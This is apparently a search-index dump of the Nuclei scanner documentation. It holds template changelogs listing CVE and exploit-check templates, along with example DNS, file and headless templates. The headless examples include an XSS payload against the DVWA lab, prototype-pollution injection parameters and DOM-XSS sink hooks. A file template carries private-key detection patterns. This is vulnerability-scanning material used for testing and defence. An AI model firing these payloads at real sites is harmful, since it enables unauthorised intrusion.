cves/2021/CVE-2021-21402.yaml by @dwisiswant0 cves/2020/CVE-2020-24550.yaml by @DhiyaneshGeek exposures/configs/netrc.yaml by @geeknik iot/upnp-device.yaml by @geeknik technologies/jellyfin-detect.yaml by @dwisiswant0 vulnerabilities/generic/cache-poisoning.yaml by @melbadry9 workflows/jellyfin-workflow.yaml by @dwisiswant0","title":"Templates v8.1.9 - 2 April 2021"},{"location":"releases/templates-changelog/#templates-v818-1-april-2021","text":"Newly added templates (46) cves/2021/CVE-2021-21975.yaml by @luci cves/2021/CVE-2021-26295.yaml by @madrobot cves/2020/CVE-2020-15148.yaml by @pikpikcu cves/2020/CVE-2020-17453.yaml by @madrobot cves/2020/CVE-2020-23517.yaml by @geeknik cves/2020/CVE-2020-25078.yaml by @pikpikcu cves/2020/CVE-2020-28208.yaml by @pdteam cves/2020/CVE-2020-35489.yaml by @soyelmago cves/2015/CVE-2015-3337.yaml by @pdteam cves/2016/CVE-2016-10033.yaml by @princechaddha cves/2017/CVE-2017-1000170.yaml by @dwisiswant0 cves/2017/CVE-2017-17562.yaml by @geeknik cves/2018/CVE-2018-0101.yaml by @dwisiswant0 exposed-panels/adobe-component-login.yaml by @DhiyaneshGeek exposed-panels/fiorilaunchpad-logon.yaml by @DhiyaneshGeek exposed-panels/joomla-panel.yaml by @its0x08 exposed-panels/netlify-cms.yaml by @sullo exposed-panels/open-stack-dashboard-login.yaml by @dhiyaneshDK exposed-panels/sitefinity-login.yaml by @dhiyaneshDK exposed-panels/wago-plc-panel.yaml by @its0x08 exposed-panels/wordpress-login.yaml by @its0x08 exposed-panels/zte-panel.yaml by @its0x08 exposures/backups/settings-php-files.yaml by @hackerrishad exposures/configs/eea-disclosure.yaml by @pikpikcu fuzzing/adminer-panel-fuzz.yaml by @geeknik fuzzing/header-command-injection.yaml by @geeknik fuzzing/wp-plugin-scan.yaml by @pdteam iot/liveview-axis-camera.yaml by @DhiyaneshGeek iot/mobotix-guest-camera.yaml by @DhiyaneshGeek iot/nuuno-network-login.yaml by @DhiyaneshGeek miscellaneous/detect-dns-over-https.yaml by @geeknik miscellaneous/detect-options-method.yaml by @pdteam miscellaneous/unpatched-coldfusion.yaml by @Daviey misconfiguration/gitlab/gitlab-public-signup.yaml by @pdteam misconfiguration/phpmyadmin-setup.yaml by @thevillagehacker takeovers/freshdesk-takeover.yaml by @NagliNagli takeovers/medium-takeover.yaml by @rtcms technologies/bolt-cms-detect.yaml by @cydave technologies/bookstack-detect.yaml by @cydave technologies/moinmoin-detect.yaml by @cydave technologies/opencast-detect.yaml by @cydave technologies/shopware-detect.yaml by @cydave technologies/strapi-cms-detect.yaml by @cydave vulnerabilities/rockethcat/unauth-message-read.yaml by @rojan-rijal vulnerabilities/thinkcmf/thinkcmf-arbitrary-code-execution.yaml by @pikpikcu workflows/worksite-takeover-workflow.yaml @pdteam","title":"Templates v8.1.8 - 1 April 2021"},{"location":"releases/templates-changelog/#templates-v817-21-mar-2021","text":"Newly added templates (0) Bug fixes","title":"Templates v8.1.7 - 21 Mar 2021"},{"location":"releases/templates-changelog/#templates-v816-21-mar-2021","text":"Newly added templates (22) cves/2021/CVE-2021-22986.yml by @iamnoooob @rootxharsh cves/2020/CVE-2020-14883.yaml by @pikpikcu cves/2020/CVE-2020-16139.yaml by @pikpikcu cves/2020/CVE-2020-29164.yaml by @geeknik cves/2020/CVE-2020-9483.yaml by @pikpikcu cves/2018/CVE-2018-11784.yaml by @geeknik cves/2019/CVE-2019-0230.yaml by @geeknik default-logins/xxljob/xxljob-default-login.yaml by pdteam dns/ec2-detection.yaml by @melbadry9 dns/worksites-detection.yaml by @melbadry9 exposed-panels/aims-password-portal.yaml by @DhiyaneshGeek exposed-panels/pandora-fms-console.yaml by @DhiyaneshGeek iot/contacam.yaml by @DhiyaneshGeek iot/epmp-login.yaml by @DhiyaneshGeek iot/hp-laserjet-detect.yaml by @DhiyaneshGeek iot/internet-service.yaml by @DhiyaneshGeek misconfiguration/exposed-sqlite-manager.yaml by @DhiyaneshGeek vulnerabilities/generic/error-based-sql-injection.yaml by @geeknik vulnerabilities/other/tpshop-directory-traversal.yaml by @pikpikcu vulnerabilities/other/viewlinc-crlf-injection.yaml by @geeknik vulnerabilities/other/xdcms-sqli.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-infinitewp-auth-bypass.yaml by @princechaddha","title":"Templates v8.1.6 - 21 Mar 2021"},{"location":"releases/templates-changelog/#templates-v815-15-mar-2021","text":"Newly added templates (30) cves/2021/CVE-2021-25281.yaml by @madrobot cves/2020/CVE-2020-13700.yaml by @pikpikcu cves/2020/CVE-2020-14092.yaml by @princechaddha cves/2020/CVE-2020-24186.yaml by @Ganofins cves/2020/CVE-2020-35951.yaml by @princechaddha cves/2018/CVE-2018-1207.yaml by @dwisiswant0 cves/2018/CVE-2018-18778.yaml by @dhiyaneshDK cves/2018/CVE-2018-3810.yaml by @princechaddha cves/2018/CVE-2018-6910.yaml by @pikpikcu cves/2018/CVE-2018-7700.yaml by @pikpikcu cves/2017/CVE-2017-3881.yaml by @dwisiswant0 cves/2015/CVE-2015-3306.yaml by @pdteam default-logins/dvwa/dvwa-default-login.yaml @pdteam exposed-panels/cisco-finesse-login.yaml by @dhiyaneshDK exposed-panels/mini-start-page.yaml by @dhiyaneshDK exposed-panels/tuxedo-connected-controller.yaml by @dhiyaneshDK exposures/configs/circleci-config.yaml by @geeknik exposures/configs/circleci-ssh-config.yaml by @geeknik misconfiguration/gitlab/gitlab-public-repos.yaml by @ldionmarcil misconfiguration/panasonic-network-management.yaml by @dhiyaneshDk network/unauth-ftp.yaml by @C3l3si4n technologies/openam-detection.yaml by @xelkomy technologies/thinkcmf-detection.yaml by @pikpikcu vulnerabilities/moodle/moodle-jitsi-plugin-xss.yaml by @aceseven vulnerabilities/other/parentlink-xss.yaml by @r3naissance vulnerabilities/other/pmb-local-file-disclosure.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-auth-bypass-wptimecapsule.yaml by @princechaddha vulnerabilities/wordpress/wordpress-rce-simplefilelist.yaml by @princechaddha vulnerabilities/wordpress/wordpress-total-upkeep-backup-download.yaml by @princechaddha","title":"Templates v8.1.5 - 15 Mar 2021"},{"location":"releases/templates-changelog/#templates-v814-10-mar-2021","text":"Newly added templates (17) cves/2021/CVE-2021-21978.yaml @dwisiswant0 cves/2020/CVE-2020-12256.yaml by @pikpikcu cves/2020/CVE-2020-12259.yaml by @pikpikcu cves/2020/CVE-2020-13483.yaml by @pikpikcu cves/2020/CVE-2020-14413.yaml by @pikpikcu cves/2015/CVE-2015-2080.yaml by @pikpikcu exposed-panels/cisco-sd-wan.yaml by @z3bd headless/dvwa-headless-automatic-login.yaml headless/postmessage-tracker.yaml headless/prototype-pollution-check.yaml headless/window-name-domxss.yaml misconfiguration/http-etcd-unauthenticated-api-data-leak.yaml by @DhiyaneshGeek network/exposed-redis.yaml network/exposed-zookeeper.yaml network/memcached-stats.yaml network/mongodb-detect.yaml network/mongodb-unauth.yaml","title":"Templates v8.1.4 - 10 Mar 2021"},{"location":"releases/templates-changelog/#templates-v813-9-march-2021","text":"Newly added templates (08) default-logins/nexus/nexus-default-password.yaml by @pikpikcu exposed-panels/oki-data.yaml by @DhiyaneshGeek exposed-panels/weatherlink.yaml by @DhiyaneshGeek exposed-panels/wso2-management-console.yaml by @DhiyaneshGeek exposures/configs/ruijie-information-disclosure.yaml by @DhiyaneshGeek misconfiguration/gitlab-snippets.yaml misconfiguration/solr-query-dashboard.yaml by @DhiyaneshGeek misconfiguration/unauthenticated-mongo-express.yaml by @DhiyaneshGeek","title":"Templates v8.1.3 - 9 March 2021"},{"location":"releases/templates-changelog/#templates-v812-6-march-2021","text":"Newly added templates (40) cves/2021/CVE-2021-21315.yaml by @pikpikcu cves/2021/CVE-2021-26855.yaml by @Mad-robot cves/2021/CVE-2021-27132.yaml by @geeknik cves/2021/CVE-2021-27330.yaml by @pikpikcu cves/2020/CVE-2020-21224.yaml by @pikpikcu cves/2020/CVE-2020-26948.yaml by @dwisiswant0 cves/2019/CVE-2019-0221.yaml by @pikpikcu cves/2019/CVE-2019-17538.yaml by @pussycat0x cves/2018/CVE-2018-11776.yaml by @pikpikcu cves/2017/CVE-2017-12611.yaml by @pikpikcu cves/2017/CVE-2017-9791.yaml by @pikpikcu cves/2017/CVE-2017-9805.yaml by @pikpikcu cves/2013/CVE-2013-1965.yaml by @pikpikcu cves/2012/CVE-2012-0392.yaml by @pikpikcu cves/2008/CVE-2008-2650.yaml by @pussycat0x cves/2007/CVE-2007-4556.yaml by @pikpikcu default-logins/alibaba/alibaba-canal-default-password.yaml by @pikpikcu exposed-panels/acunetix-panel.yaml by @joanbono exposed-panels/advance-setup.yaml by @DhiyaneshGeek exposed-panels/blue-iris-login.yaml by @DhiyaneshGeek exposed-panels/checkmarx-panel.yaml by @joanbono exposed-panels/cisco-integrated-login.yaml by @DhiyaneshGeek exposed-panels/cisco-security-details.yaml by @DhiyaneshGeek exposed-panels/hivemanager-login-panel.yaml by @binaryfigments exposed-panels/hmc-hybris-panel.yaml by @dogasantos exposed-panels/keenetic-web-login.yaml by @DhiyaneshGeek exposed-panels/nessus-panel.yaml by @joanbono exposed-panels/remote-ui-login.yaml by @DhiyaneshGeek exposed-panels/sphider-login.yaml by @DhiyaneshGeek exposed-panels/total-web.yaml by @DhiyaneshGeek exposures/configs/exposed-bitkeeper.yaml by @daffainfo exposures/configs/exposed-bzr.yaml by @daffainfo exposures/configs/exposed-darcs.yaml by @daffainfo exposures/configs/exposed-hg.yaml by @daffainfo exposures/configs/joomla-config-file.yaml by @oppsec misconfiguration/d-link-arbitary-fileread.yaml by @DhiyaneshGeek technologies/burp-api-detect.yaml by @joanbono technologies/ilo-detect.yaml by @milo2012 technologies/microsoft-echange-server-detect.yaml by @pikpikcu vulnerabilities/other/simple-employee-rce.yaml by @pikpikcu","title":"Templates v8.1.2 - 6 March 2021"},{"location":"releases/templates-changelog/#templates-v811-1-march-2021","text":"Newly added templates (34) cves/2021/CVE-2021-3129.yaml by @z3bd cves/2021/CVE-2021-3378.yaml by @dwisiswant0 cves/2020/CVE-2020-11853.yaml by @dwisiswant0 cves/2020/CVE-2020-11854.yaml by @dwisiswant0 cves/2020/CVE-2020-35729.yaml by @dwisiswant0 cves/2018/CVE-2018-1335.yaml by @pikpikcu cves/2017/CVE-2017-16877.yaml by @pikpikcu cves/2010/CVE-2010-2861.yaml by @pikpikcu default-logins/UCMDB/micro-focus-ucmdb-default-credentials.yaml by @dwisiswant0 default-logins/axis2/axis2-default-password.yaml by @pikpikcu default-logins/dell/dell-idrac9-default-login.yaml by @kophjager007 default-logins/frps/frp-default-credentials.yaml by @pikpikcu exposed-panels/crush-ftp-login.yaml by @DhiyaneshGeek exposed-panels/d-link-wireless.yaml by @DhiyaneshGeek exposed-panels/jfrog.yaml by @DhiyaneshGeek exposed-panels/microsoft-exchange-login.yaml by @DhiyaneshGeek exposed-panels/plesk-onyx.yaml by @DhiyaneshGeek exposed-panels/powerlogic-ion.yaml by @DhiyaneshGeek exposed-panels/radius-manager.yaml by @DhiyaneshGeek exposed-panels/siteomat-login.yaml by @DhiyaneshGeek exposed-panels/unauthenticated-frp.yaml by @pikpikcu exposed-panels/vigor-login.yaml by @DhiyaneshGeek exposed-panels/vmware-horizon.yaml by @DhiyaneshGeek exposed-panels/web-local-craft.yaml by @DhiyaneshGeek exposed-panels/xenmobile-login.yaml by @DhiyaneshGeek miscellaneous/moodle-changelog.yaml by @oppsec misconfiguration/phpmyadmin-wooyun.yaml by @DhiyaneshGeek technologies/dell/dell-idrac6-detect.yaml by @kophjager007 technologies/dell/dell-idrac7-detect.yaml by @kophjager007 technologies/dell/dell-idrac8-detect.yaml by @kophjager007 vulnerabilities/other/duomicms-sql-injection.yaml by @pikpikcu vulnerabilities/other/ruijie-networks-lfi.yaml by @pikpikcu vulnerabilities/other/ruijie-networks-rce.yaml by @pikpikcu workflows/micro-focus-workflow.yaml by @dwisiswant0","title":"Templates v8.1.1 - 1 March 2021"},{"location":"releases/templates-changelog/#templates-v810-26-feb-2021","text":"Newly added templates (32) cves/2021/CVE-2021-21972.yaml by @dwisiswant0 cves/2020/CVE-2020-17496.yaml by @pussycat0x cves/2020/CVE-2020-22840.yaml by @geeknik cves/2017/CVE-2017-7269.yaml by @thomas_from_offensity cves/2016/CVE-2016-7552.yaml by @dwisiswant0 cves/2015/CVE-2015-5688.yaml by @pikpikcu default-logins/dell/dell-idrac-default-login.yaml by @kophjager007 default-logins/rockmongo/rockmongo-default-credentials.yaml by @pikpikcu exposures/apis/openapi.yaml by @pikpikcu exposures/configs/awstats-config.yaml by @hackerrishad exposures/configs/awstats-script.yaml by @hackerrishad exposures/configs/honeywell-scada-config.yaml by @alperenkesk exposures/files/bower-json.yaml by @oppsec exposures/files/yarn-lock.yaml by @oppsec miscellaneous/joomla-htaccess.yaml by @oppsec miscellaneous/joomla-manifest-file.yaml by @oppsec miscellaneous/phpmyadmin-setup.yaml by @hackerrishad misconfiguration/haproxy-status.yaml by @DhiyaneshGeek misconfiguration/horde-unauthenticated.yaml by @pikpikcu misconfiguration/java-melody-exposed.yaml by @DhiyaneshGeek misconfiguration/tcpconfig.yaml by @DhiyaneshGeek misconfiguration/ups-status.yaml by @DhiyaneshGeek technologies/dell-idrac-detect.yaml by @kophjager007 technologies/gunicorn-detect.yaml by @joanbono vulnerabilities/other/rockmongo-xss.yaml by @pikpikcu vulnerabilities/other/weiphp-path-traversal.yaml by @pikpikcu vulnerabilities/other/zhiyuan-oa-info-leak.yaml by @pikpikcu vulnerabilities/other/zhiyuan-oa-session-leak.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-affiliatewp-log.yaml by @DhiyaneshGeek vulnerabilities/wordpress/wp-license-file.yaml by @YashGoti vulnerabilities/wordpress/wp-uploads-listing.yaml by @YashGoti workflows/dell-idrac-workflow.yaml by @kophjager007","title":"Templates v8.1.0 - 26 Feb 2021"},{"location":"releases/templates-changelog/#templates-v809-22-feb-2021","text":"Newly added templates (19) cves/2020/CVE-2020-24571.yaml by @pikpikcu cves/2020/CVE-2020-26073.yaml by @madrobot cves/2019/CVE-2019-14205.yaml by @pikpikcu cves/2019/CVE-2019-16097.yaml by @pikpikcu cves/2019/CVE-2019-18393.yaml by @pikpikcu cves/2018/CVE-2018-1000861.yaml by @dhiyaneshDK cves/2018/CVE-2018-12613.yaml by @pikpikcu exposures/configs/ftp-credentials-exposure.yaml by @pikpikcu exposures/configs/sftp-credentials-exposure.yaml by @sheikhrishad exposures/logs/laravel-log-file.yaml by @sheikhrishad exposures/logs/npm-log-file.yaml by @sheikhrishad technologies/harbor-detect.yaml by @pikpikcu vulnerabilities/other/dedecms-openredirect.yaml by @pikpikcu vulnerabilities/other/finereport-path-traversal.yaml by @pikpikcu vulnerabilities/other/metinfo-lfi.yaml by @pikpikcu vulnerabilities/other/seacms-rce.yaml by @pikpikcu vulnerabilities/other/webui-rce.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-xmlrpc-listmethods.yaml by @0ut0fb4nd workflows/harbor-workflow.yaml by @pikpikcu","title":"Templates v8.0.9 - 22 Feb 2021"},{"location":"releases/templates-changelog/#templates-v808-16-feb-2021","text":"Newly added templates (36) cves/2020/CVE-2020-10546.yaml by @Mad-robot cves/2020/CVE-2020-10547.yaml by @Mad-robot cves/2020/CVE-2020-10548.yaml by @Mad-robot cves/2020/CVE-2020-10549.yaml by @Mad-robot cves/2020/CVE-2020-11991.yaml by @pikpikcu cves/2020/CVE-2020-2036.yaml by @Mad-robot cves/2020/CVE-2020-25213.yaml by @foulenzer cves/2020/CVE-2020\u201326073.yaml by @Mad-robot cves/2020/CVE-2020-27982.yaml by @Mad-robot cves/2020/CVE-2020-5847.yaml by @Mad-robot cves/2020/CVE-2020-9425.yaml by @Mad-robot cves/2019/CVE-2019-3403.yaml by @Ganofins cves/2018/CVE-2018-7600.yaml by @pikpikcu cves/2017/CVE-2017-1000028.yaml by @pikpikcu cves/2017/CVE-2017-12635.yaml by @pikpikcu cves/2016/CVE-2016-3081.yaml by @DhiyaneshGeek cves/2015/CVE-2015-1427.yaml by @pikpikcu cves/2014/CVE-2014-3120.yaml by @pikpikcu default-logins/nps/nps-default-password.yaml by @pikpikcu default-logins/samsung/samsung-wlan-ap-default-credentials.yaml by @pikpikcu exposures/configs/lvmeng-uts-disclosure.yaml by @pikpikcu exposures/files/keycloak-json.yaml by @oppsec misconfiguration/jboss-status.yaml by @DhiyaneshGeek misconfiguration/mikrotik-graph.yaml by @DhiyaneshGeek misconfiguration/unauthenticated-prtg.yaml by @DhiyaneshGeek vulnerabilities/other/cacti-weathermap-file-write.yaml by @pikpikcu vulnerabilities/other/oa-tongda-path-traversal.yaml by @pikpikcu vulnerabilities/other/powercreator-cms-rce.yaml by @pikpikcu vulnerabilities/samsung/samsung-wlan-ap-lfi.yaml by @pikpikcu vulnerabilities/samsung/samsung-wlan-ap-rce.yaml by @pikpikcu vulnerabilities/samsung/samsung-wlan-ap-xss.yaml by @pikpikcu vulnerabilities/thinkcmf/thinkcmf-lfi.yaml by @pikpikcu vulnerabilities/thinkcmf/thinkcmf-rce.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-zebra-form-xss.yaml by @Mad-robot workflows/cacti-workflow.yaml by @pikpikcu workflows/samsung-wlan-ap-workflow.yaml by @pikpikcu","title":"Templates v8.0.8 - 16 Feb 2021"},{"location":"template-examples/dns/","text":"Basic template \u00b6 Basic DNS Request to detect if a CNAME record exists for an input. id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" Multiple matcher \u00b6 An example showcasing multiple matchers of nuclei, allowing detection of Subdomains with CNAME records that point to either zendesk.com or github.io . id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"DNS"},{"location":"template-examples/dns/#basic-template","text":"Basic DNS Request to detect if a CNAME record exists for an input. id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\"","title":"Basic template"},{"location":"template-examples/dns/#multiple-matcher","text":"An example showcasing multiple matchers of nuclei, allowing detection of Subdomains with CNAME records that point to either zendesk.com or github.io . id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"Multiple matcher"},{"location":"template-examples/file/","text":"Basic File Template \u00b6 This template checks for a pattern in provided files. id : ssh-public-key info : name : SSH Public Key Detect author : pd-team severity : low file : - extensions : - pub max-size : 1024 # read very small chunks matchers : - type : word words : - \"ssh-rsa\" Extension Denylist with No-Recursive \u00b6 The below template is same as last one, but it makes use of an extension denylist along with the no-recursive option. id : ssh-private-key info : name : SSH Private Key Detect author : pd-team severity : high file : - extensions : - all denylist : - pub no-recursive : true max-size : 1024 # read very small chunks matchers : - type : word words : - \"BEGIN OPENSSH PRIVATE KEY\" - \"BEGIN PRIVATE KEY\" - \"BEGIN RSA PRIVATE KEY\" - \"BEGIN DSA PRIVATE KEY\" - \"BEGIN EC PRIVATE KEY\" - \"BEGIN PGP PRIVATE KEY BLOCK\" - \"ssh-rsa\"","title":"File"},{"location":"template-examples/file/#basic-file-template","text":"This template checks for a pattern in provided files. id : ssh-public-key info : name : SSH Public Key Detect author : pd-team severity : low file : - extensions : - pub max-size : 1024 # read very small chunks matchers : - type : word words : - \"ssh-rsa\"","title":"Basic File Template"},{"location":"template-examples/file/#extension-denylist-with-no-recursive","text":"The below template is same as last one, but it makes use of an extension denylist along with the no-recursive option. id : ssh-private-key info : name : SSH Private Key Detect author : pd-team severity : high file : - extensions : - all denylist : - pub no-recursive : true max-size : 1024 # read very small chunks matchers : - type : word words : - \"BEGIN OPENSSH PRIVATE KEY\" - \"BEGIN PRIVATE KEY\" - \"BEGIN RSA PRIVATE KEY\" - \"BEGIN DSA PRIVATE KEY\" - \"BEGIN EC PRIVATE KEY\" - \"BEGIN PGP PRIVATE KEY BLOCK\" - \"ssh-rsa\"","title":"Extension Denylist with No-Recursive"},{"location":"template-examples/headless/","text":"Basic Headless Navigation Example \u00b6 This template visits a URL in the headless browser and waits for it to load. id : basic-headless-request info : name : Basic Headless Request author : pdteam severity : info headless : - steps : - action : navigate args : url : \"{{BaseURL}}\" - action : waitload Headless prototype pollution detection \u00b6 The below template detects prototype pollution on pages with Nuclei headless capabilities. The code for detection is taken from https://github.com/msrkp/PPScan . We make use of script injection capabilities of nuclei to provide reliable detection for prototype pollution. id : prototype-pollution-check info : name : Prototype Pollution Check author : pd-team severity : medium reference : https://github.com/msrkp/PPScan headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : setheader args : part : response key : X-Frame-Options value : foo - action : setheader args : part : response key : If-None-Match value : foo # Set the hook to override window.data for xss detection - action : script args : hook : true code : | // Hooking code adapted from https://github.com/msrkp/PPScan/blob/main/scripts/content_script.js (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function check() { loc = location.href; if (loc.indexOf(\"e32a5ec9c99\") >= 0 && loc.search(\"a0def12bce\") == -1) { setTimeout(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\") { logger(location.href); } var url = new URL(location.origin + location.pathname); url.hash = \"__proto__[a0def12bce]=ddcb362f1d60&__proto__.a0def12bce=ddcb362f1d60&dummy\"; location = url.href; }, 5 * 1000); } else if (loc.search(\"a0def12bce\") != -1) { setTimeout(function() { if (Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } window.close(); }, 5 * 1000); } else { var url = new URL(loc); url.searchParams.append(\"__proto__[e32a5ec9c99]\", \"ddcb362f1d60\"); url.searchParams.append(\"__proto__.e32a5ec9c99\", \"ddcb362f1d60\"); location = url.href; } } window.onload = function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } else { check(); } }; var timerID = setInterval(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); clearInterval(timerID); } }, 5 * 1000)})(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"__proto__\" extractors : - type : kval part : alerts kval : - alerts DVWA XSS Reproduction With Headless Mode \u00b6 This template logs into DVWA (Damn Vulnerable Web App) and tries to automatically reproduce a Reflected XSS, returning a match if it found that the payload was executed successfully. id : dvwa-xss-verification info : name : DVWA Reflected XSS Verification author : pd-team severity : info headless : - steps : - args : url : \"{{BaseURL}}\" action : navigate - action : waitload # Set the hook to override window.data for xss detection - action : script args : hook : true code : \"(function() { window.alert = function() { window.data = 'found' } })()\" - args : by : x value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : x value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : x xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload - args : by : x xpath : /html/body/div/div[2]/div/ul[2]/li[11]/a action : click - action : waitload - args : by : x value : '\"><svg/onload=alert(1)>' xpath : /html/body/div/div[3]/div/div/form/p/input action : text - args : keys : \"\\r\" # Press the enter key on the keyboard action : keyboard - action : waitload - action : script name : alert args : code : \"window.data\" matchers : - part : alert type : word words : - \"found\" DOM XSS Detection \u00b6 This template performs detection of DOM-XSS for window.name source by hooking common sinks such as eval , innerHTML and document.write . id : window-name-domxss info : name : window.name DOM XSS author : pd-team severity : medium headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : script args : hook : true code : | (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function getStackTrace () { var stack; try { throw new Error(''); } catch (error) { stack = error.stack || ''; } stack = stack.split('\\n').map(function (line) { return line.trim(); }); return stack.splice(stack[0] == 'Error' ? 2 : 1); } window.name = \"{{randstr_1}}'\\\"<>\"; var oldEval = eval; var oldDocumentWrite = document.write; var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set; Object.defineProperty(Element.prototype, 'innerHTML', { set: function innerHTML_Setter(val) { if (val.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()}); } return setter.call(this, val) } }); eval = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; document.write = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; })(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"sink:\" extractors : - type : kval part : alerts kval : - alerts","title":"Headless"},{"location":"template-examples/headless/#basic-headless-navigation-example","text":"This template visits a URL in the headless browser and waits for it to load. id : basic-headless-request info : name : Basic Headless Request author : pdteam severity : info headless : - steps : - action : navigate args : url : \"{{BaseURL}}\" - action : waitload","title":"Basic Headless Navigation Example"},{"location":"template-examples/headless/#headless-prototype-pollution-detection","text":"The below template detects prototype pollution on pages with Nuclei headless capabilities. The code for detection is taken from https://github.com/msrkp/PPScan . We make use of script injection capabilities of nuclei to provide reliable detection for prototype pollution. id : prototype-pollution-check info : name : Prototype Pollution Check author : pd-team severity : medium reference : https://github.com/msrkp/PPScan headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : setheader args : part : response key : X-Frame-Options value : foo - action : setheader args : part : response key : If-None-Match value : foo # Set the hook to override window.data for xss detection - action : script args : hook : true code : | // Hooking code adapted from https://github.com/msrkp/PPScan/blob/main/scripts/content_script.js (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function check() { loc = location.href; if (loc.indexOf(\"e32a5ec9c99\") >= 0 && loc.search(\"a0def12bce\") == -1) { setTimeout(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\") { logger(location.href); } var url = new URL(location.origin + location.pathname); url.hash = \"__proto__[a0def12bce]=ddcb362f1d60&__proto__.a0def12bce=ddcb362f1d60&dummy\"; location = url.href; }, 5 * 1000); } else if (loc.search(\"a0def12bce\") != -1) { setTimeout(function() { if (Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } window.close(); }, 5 * 1000); } else { var url = new URL(loc); url.searchParams.append(\"__proto__[e32a5ec9c99]\", \"ddcb362f1d60\"); url.searchParams.append(\"__proto__.e32a5ec9c99\", \"ddcb362f1d60\"); location = url.href; } } window.onload = function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } else { check(); } }; var timerID = setInterval(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); clearInterval(timerID); } }, 5 * 1000)})(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"__proto__\" extractors : - type : kval part : alerts kval : - alerts","title":"Headless prototype pollution detection"},{"location":"template-examples/headless/#dvwa-xss-reproduction-with-headless-mode","text":"This template logs into DVWA (Damn Vulnerable Web App) and tries to automatically reproduce a Reflected XSS, returning a match if it found that the payload was executed successfully. id : dvwa-xss-verification info : name : DVWA Reflected XSS Verification author : pd-team severity : info headless : - steps : - args : url : \"{{BaseURL}}\" action : navigate - action : waitload # Set the hook to override window.data for xss detection - action : script args : hook : true code : \"(function() { window.alert = function() { window.data = 'found' } })()\" - args : by : x value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : x value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : x xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload - args : by : x xpath : /html/body/div/div[2]/div/ul[2]/li[11]/a action : click - action : waitload - args : by : x value : '\"><svg/onload=alert(1)>' xpath : /html/body/div/div[3]/div/div/form/p/input action : text - args : keys : \"\\r\" # Press the enter key on the keyboard action : keyboard - action : waitload - action : script name : alert args : code : \"window.data\" matchers : - part : alert type : word words : - \"found\"","title":"DVWA XSS Reproduction With Headless Mode"},{"location":"template-examples/headless/#dom-xss-detection","text":"This template performs detection of DOM-XSS for window.name source by hooking common sinks such as eval , innerHTML and document.write . id : window-name-domxss info : name : window.name DOM XSS author : pd-team severity : medium headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : script args : hook : true code : | (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function getStackTrace () { var stack; try { throw new Error(''); } catch (error) { stack = error.stack || ''; } stack = stack.split('\\n').map(function (line) { return line.trim(); }); return stack.splice(stack[0] == 'Error' ? 2 : 1); } window.name = \"{{randstr_1}}'\\\"<>\"; var oldEval = eval; var oldDocumentWrite = document.write; var setter = 